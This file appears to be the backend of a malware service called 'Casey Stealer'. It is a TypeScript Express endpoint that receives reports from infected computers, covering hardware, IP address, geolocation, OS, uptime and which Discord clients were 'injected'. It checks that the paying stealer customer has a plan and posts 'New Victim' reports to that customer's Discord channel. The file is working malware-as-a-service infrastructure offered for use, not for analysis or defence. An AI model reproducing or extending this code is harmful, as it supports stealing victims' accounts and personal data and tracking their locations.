import { Request, Response } from 'express';
import { EmbedBuilder } from '@discordjs/builders';
import { emojis } from '../../utils/emojis';

import { client } from '../../app';
import { ChannelType } from 'discord.js';

import { PrismaClient } from '@prisma/client'

const prisma = new PrismaClient();


export default {
    name: `/api/new-injection`, method: 'post',

    async execute(req: Request, res: Response) {
        const { computer_name, ram, cpu, network, distro, uptime, injections, stealer_user } = req?.body;
        console.log(stealer_user)
        if(!stealer_user) return;

        const user = await prisma.users.findFirst({
            where: {
                id: stealer_user
            }
        });
        console.log(user);

        if(!user?.plan) return;

        const embed = new EmbedBuilder().setTimestamp().setColor(953553)
        .setAuthor({ name: 'Casey | New Victim', iconURL: client.user?.avatarURL()! })
        .addFields(
            {
                name: `${emojis.computer} Computer:`,
                value: computer_name || 'Unknown'
            },
            {
                name: `${emojis.cpu} CPU:`,
                value: cpu || 'Unknown'
            },
            {
                name: `${emojis.ram} RAM:`,
                value: `${ram}GB`
            },
        )
        .setFooter({ text: 'Casey Stealer', iconURL: client.user?.avatarURL()! });

        const flag = getFlagEmoji(network?.country.toLowerCase());

        const more_embed = new EmbedBuilder().setTimestamp().setColor(953553)
        .setAuthor({ name: 'Casey | Victim Informations', iconURL: client.user?.avatarURL()! })
        .addFields(
            {
                name: `${emojis.ip} IP Adress:`,
                value: `${network?.ip} ${flag}`,
                inline: false
            },
            {
                name: `${emojis.system} Operational System:`,
                value: distro || 'Unknown',
                inline: true
            },
            {
                name: `${emojis.uptime} Uptime:`,
                value: `<t:${~~(Math.round(Date.now() - uptime) / 1000)}:R> **(<t:${~~(Math.round(Date.now() - uptime) / 1000)}:D>)**`,
                inline: true
            },
            {
                name: `${emojis.location} Location:`,
                value: `${network?.city}, ${network?.region}, ${network?.country}.`,
                inline: false
            },
            {
                name: `${emojis.injection} Apps Infected (${injections.length}):`,
                value: `${injections.length ? injections.join(', ') : 'No Discord Clients Found'}.`,
                inline: false
            },
        )
        .setFooter({ text: 'Casey Stealer', iconURL: client.user?.avatarURL()! });

        const guild = await client?.guilds?.fetch(user?.guild_id!);
        const channel = await guild?.channels?.fetch(user?.channel_id!);

        if(channel?.type !== ChannelType.GuildText) return;

        const message = await channel?.send({
            embeds: [
                embed
            ]
        });
        const thread = await message.startThread({
            name: 'Informations about the Victim',
            autoArchiveDuration: 60,
        });

        thread.send({
            embeds: [
                more_embed
            ]
        });

        res.status(200);

  },
};

function getFlagEmoji(countryCode: string) {
    const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map((char) => 127397 + char.charCodeAt(0))
return String.fromCodePoint(...codePoints)
};